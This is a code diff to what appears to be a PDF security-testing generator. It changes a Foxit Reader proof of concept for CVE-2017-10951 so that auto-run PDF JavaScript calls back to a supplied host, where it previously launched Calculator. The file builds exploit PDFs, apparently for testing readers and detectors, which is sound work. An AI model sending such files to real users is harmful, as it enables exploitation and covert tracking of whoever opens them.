@@ -626,15 +626,15 @@ startxref
 
 # Foxit PDF Reader PoC, macOS version "patch gap" : CVE-2017-10951
 # Source: https://twitter.com/l33d0hyun/status/1448342241647366152
-# This sample contains no phone-home
-def create_malpdf10(filename):
+# Uses this.getURL() to trigger a callback via Foxit Reader's JavaScript engine
+def create_malpdf10(filename, host):
     with open(filename, "w") as file:
         file.write('''%PDF-1.7
 1 0 obj
 <</Pages 1 0 R /OpenAction 2 0 R>>
 2 0 obj
 <</S /JavaScript /JS (
-this.getURL("file:///System/Applications/Calculator.app")
+this.getURL("''' + host + '''/test10")
 )>> trailer <</Root 1 0 R>>''')
 
 # Eicar test file embedded in PDF. Source: https://github.com/fire1ce/eicar-standard-antivirus-test-files
@@ -1715,7 +1715,7 @@ def main():
         7: (create_malpdf7, ensure_scheme(host)),
         8: (create_malpdf8, ensure_scheme(host)),
         9: (create_malpdf9, ensure_scheme(host)),
-        10: (create_malpdf10, None),
+        10: (create_malpdf10, ensure_scheme(host)),
         11: (create_malpdf11, None),
         12: (create_malpdf12, ensure_scheme(host)),
         13: (create_malpdf13, ensure_scheme(host)),
